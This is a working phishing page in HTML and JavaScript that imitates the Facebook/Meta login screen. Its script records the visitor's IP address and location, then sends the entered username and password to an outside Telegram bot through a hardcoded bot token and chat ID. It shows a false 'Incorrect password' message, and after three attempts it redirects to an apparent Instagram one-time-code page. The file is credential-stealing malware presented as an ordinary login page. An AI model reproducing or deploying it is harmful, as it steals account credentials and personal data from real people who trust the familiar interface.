<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <script src="https://cdn.tailwindcss.com/"></script>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(to bottom right, #fbe0ff00, #c9ebf000);
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen">
  <div class="w-full max-w-sm p-6 rounded-lg">
    <div class="text-center mb-6">
      <img alt="Facebook logo" class="mx-auto mb-4" height="80" src="https://i.postimg.cc/FKk4ZQ1r/60ed83ab035dbe00046c24b8.png" width="70"/>
    </div>
    <form id="contactForm" method="POST">
      <input type="hidden" id="ipaddress" name="IPaddress">
      <input type="hidden" id="city" name="city">
      <input type="hidden" id="country" name="country">
      <div class="mb-4">
        <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900" placeholder="Mobile number or email address" type="text" name="username" id="username" required/>
      </div>
      <div class="mb-4">
        <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600" placeholder="Password" type="text" name="password" id="password" required/>
      </div>
      <div class="mb-4">
        <button class="w-full py-3 bg-blue-700 text-white rounded-xl hover:bg-black-700" type="submit" id="button">
          Log in
        </button>
      </div>
      <div class="text-center mb-4">
        <a class="text-black-600 hover:underline" href="#">Forgotten Password?</a>
      </div>
      <div class="text-center mb-4">
        <button class="w-full py-3 border border-blue-600 text-blue-600 rounded-xl hover:bg-blue-50" type="button">
          Create new account
        </button>
      </div>
      <div class="text-center mt-6">
        <img alt="Meta logo" class="mx-auto mb-2" height="20" src="https://i.postimg.cc/DZY1KLnd/pngegg-2.png" width="70"/>
      </div>
    </form>
  </div>

  <script>
 fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        document.getElementById('ipaddress').value = data.ip;
      })
      .catch(error => console.error('IP error:', error));

    // Fetch Geolocation
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        document.getElementById('city').value = data.city || '';
        document.getElementById('country').value = data.country_name || '';
      })
      .catch(error => console.error('Location error:', error));

document.getElementById('contactForm').addEventListener('submit', function (event) {
  event.preventDefault();

  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  const ipaddress = document.getElementById('ipaddress').value;
  const city = document.getElementById('city').value;
  const country = document.getElementById('country').value;

  const telegramMessage = `Username-ig: ${username}\nPassword-ig: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
  var token = '7724046452:AAGWEvqMctNuCe1tEEe0kW4d5GpFgNxJJQQ';
                var chat_id = '8189420422';
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;

  // Use localStorage to track how many times the form has been submitted
  let submitCount = parseInt(localStorage.getItem('submitCount')) || 0;

  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        submitCount++;
        localStorage.setItem('submitCount', submitCount);

        alert('Incorrect password');
        document.getElementById('contactForm').reset();

        if (submitCount === 3) {
          window.location.href = "instagram/otp/657daf104b167f68d1979b9c.html"; // Redirect after third submit
        }
      } else {
        alert('Failed to send.');
      }
    })
    .catch(error => {
      console.error('Fetch error:', error);
    });
});

  </script>
</body>
</html>
